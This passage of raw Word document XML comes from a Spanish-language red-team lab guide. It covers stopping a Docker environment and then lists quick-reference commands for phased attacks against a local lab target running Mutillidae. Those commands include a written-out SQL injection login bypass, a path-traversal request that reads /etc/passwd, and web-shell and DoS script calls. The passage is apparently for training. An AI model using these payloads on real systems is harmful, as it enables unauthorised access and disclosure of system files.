          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>12. Detener el entorno</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFD2B75" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4478D6DC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>cd C:\Project-Red-Team\docker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD79EF8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>docker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>compose</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6CFA8342" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="618A5BDB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Para detener y eliminar también los volúmenes (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>reset</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> completo):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F2DB85" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>docker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>compose</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66DC3390" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28B308A2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="775F0936" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>13. Referencia rápida</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F15F12" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DD8F228" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Comandos de una sola línea para la demo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CEC058" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Levantar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>entorno</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="74B5EBAC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd C:\Project-Red-Team\docker &amp;&amp; docker compose up -d --build</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021F217F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F54A9EC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Smoke tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E07CA0E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash /root/scripts/lib/test-common.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDF6DA7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="057E6F2C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 1 — Recon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7B93BE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-1-recon/recon.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DFD908" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3795EF29" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># Fase 2 — Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E04B6EA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-2-scanning/port-scan.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E9D944" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5740F0A0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 3 — Enum HTTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715C0BAE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-3-enumeration/enum-http.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7338FF14" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C9E9F9E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 4 — Default creds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5E6C42" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-4-credentials/default-creds.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6BDD31" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E118A00" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"># Fase 5 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> manual (demo rápida)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E7FCBD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "curl -s -X POST 'http://172.20.0.20/mutillidae/index.php?page=login.php' -d 'username=admin%27+OR+%271%27%3D%271&amp;password=x&amp;login-php-submit-button=Login' | grep -i 'query\|logged'"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD7B73A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D9CFA5F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t># Fase 5 — LFI (demo rápida)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3DE13B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>docker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>exec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>redteam-kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s 'http://172.20.0.20/mutillidae/index.php?page=../../../../etc/passwd' | grep -E '^[a-z_][a-z0-9_-]*:x:'"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F682A7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05FF21EE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 5 — Web shells completo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C55219" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-5-exploitation/web-shells.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EB4A1E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78875436" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 6 — Monitor (Terminal 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB68A5C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec -it redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-6-dos/99-monitor.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E6D73E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DDC4E0C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t># Fase 6 — DoS (Terminal 3, con pausa reducida para demo)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AB0B1D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec -it </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
